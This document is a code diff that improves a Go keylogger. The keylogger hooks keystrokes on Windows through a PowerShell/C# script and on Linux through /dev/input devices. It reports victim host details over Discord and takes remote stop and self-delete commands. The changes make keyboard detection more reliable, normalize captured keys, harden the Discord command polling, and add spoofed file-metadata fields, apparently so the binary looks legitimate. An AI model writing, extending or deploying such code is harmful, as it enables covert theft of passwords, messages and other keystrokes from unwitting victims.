@@ -92,6 +92,15 @@ func gatherSystemInfo() string {
 	hostname := utils.GetHostname()
 	username := utils.GetUsername()
 
+	embed := ""
+	if strings.TrimSpace(EmbedFileDescription) != "" || strings.TrimSpace(EmbedCompanyName) != "" || strings.TrimSpace(EmbedProductVersion) != "" {
+		embed = fmt.Sprintf(`
+**📎 EMBED**
+- **Description:** %s
+- **Company:** %s
+- **Version:** %s
+`, EmbedFileDescription, EmbedCompanyName, EmbedProductVersion)
+	}
 	return fmt.Sprintf(`
 🔴 **KEYLOGGER ACTIVATED** 🔴
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -103,7 +112,7 @@ func gatherSystemInfo() string {
 - **MAC:** %s
 - **OS:** %s
 - **Started:** %s
-
+%s
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 **Commands:**
 /stoplogger - Stop logging
@@ -117,6 +126,7 @@ func gatherSystemInfo() string {
 		utils.GetMACAddress(),
 		utils.GetOS(),
 		time.Now().Format("2006-01-02 15:04:05"),
+		embed,
 	)
 }
 
@@ -130,6 +140,7 @@ func startKeylogger() {
 
 func keylogWindows() {
 	psScript := `
+Add-Type -AssemblyName System.Windows.Forms
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -214,10 +225,14 @@ func findKeyboardDevices() []string {
 	for _, file := range files {
 		if strings.HasPrefix(file.Name(), "event") {
 			devicePath := filepath.Join("/dev/input", file.Name())
-
-			cmd := exec.Command("cat", fmt.Sprintf("/sys/class/input/%s/device/name", file.Name()))
-			output, err := cmd.Output()
-			if err == nil && strings.Contains(strings.ToLower(string(output)), "keyboard") {
+			namePath := filepath.Join("/sys/class/input", file.Name(), "device", "name")
+			b, err := os.ReadFile(namePath)
+			if err != nil {
+				continue
+			}
+			lower := strings.ToLower(strings.TrimSpace(string(b)))
+			if strings.Contains(lower, "keyboard") || strings.Contains(lower, "keypad") ||
+				(strings.Contains(lower, "hid") && strings.Contains(lower, "key")) {
 				devices = append(devices, devicePath)
 			}
 		}
@@ -306,34 +321,35 @@ func processKeyPress(key string) {
 
 func normalizeKey(key string) string {
 	key = strings.TrimSpace(key)
-
-	replacements := map[string]string{
-		"Space":    " ",
-		"Return":   "[ENTER]",
-		"Back":     "[BACK]",
-		"Tab":      "[TAB]",
-		"Shift":    "",
-		"Control":  "",
-		"Alt":      "",
-		"Capital":  "[CAPS]",
-		"Escape":   "[ESC]",
-		"[WINDOW:": "\n\n[WINDOW:",
+	if strings.HasPrefix(key, "[WINDOW:") {
+		return "\n\n" + key
 	}
-
-	for old, new := range replacements {
-		if strings.Contains(key, old) {
-			return new
-		}
+	switch {
+	case key == "Space":
+		return " "
+	case key == "Return":
+		return "[ENTER]"
+	case key == "Back":
+		return "[BACK]"
+	case key == "Tab":
+		return "[TAB]"
+	case key == "Shift" || key == "LShiftKey" || key == "RShiftKey":
+		return ""
+	case key == "Control" || key == "LControlKey" || key == "RControlKey":
+		return ""
+	case key == "Alt" || key == "LMenu" || key == "RMenu":
+		return ""
+	case key == "Capital":
+		return "[CAPS]"
+	case key == "Escape":
+		return "[ESC]"
 	}
-
 	if len(key) == 1 {
 		return key
 	}
-
-	if strings.HasPrefix(key, "D") && len(key) == 2 {
+	if strings.HasPrefix(key, "D") && len(key) == 2 && key[1] >= '0' && key[1] <= '9' {
 		return string(key[1])
 	}
-
 	return ""
 }
 
@@ -426,26 +442,30 @@ func monitorDiscordCommands() {
 			continue
 		}
 
-		latestMsg := messages[0]
-
-		if latestMsg.ID == lastMessageID || latestMsg.Author.Bot {
-			time.Sleep(POLL_INTERVAL)
-			continue
-		}
-
-		lastMessageID = latestMsg.ID
-
-		command := strings.ToLower(strings.TrimSpace(latestMsg.Content))
-
-		switch command {
-		case "/stoplogger":
-			dg.ChannelMessageSend(discordChannelID, "🛑 **Keylogger stopped**")
-			stopLogger()
-		case "/deletelogger":
-			dg.ChannelMessageSend(discordChannelID, "🗑️ **Removing keylogger from system...**")
-			deleteLogger()
-			dg.ChannelMessageSend(discordChannelID, "✅ **Keylogger removed**")
-			os.Exit(0)
+		for i := 0; i < len(messages); i++ {
+			msg := messages[i]
+			if msg.Author.Bot {
+				continue
+			}
+			command := strings.ToLower(strings.TrimSpace(msg.Content))
+			if command != "/stoplogger" && command != "/deletelogger" {
+				continue
+			}
+			if msg.ID == lastMessageID {
+				break
+			}
+			lastMessageID = msg.ID
+			switch command {
+			case "/stoplogger":
+				dg.ChannelMessageSend(discordChannelID, "🛑 **Keylogger stopped**")
+				stopLogger()
+			case "/deletelogger":
+				dg.ChannelMessageSend(discordChannelID, "🗑️ **Removing keylogger from system...**")
+				deleteLogger()
+				dg.ChannelMessageSend(discordChannelID, "✅ **Keylogger removed**")
+				os.Exit(0)
+			}
+			break
 		}
 
 		time.Sleep(POLL_INTERVAL)
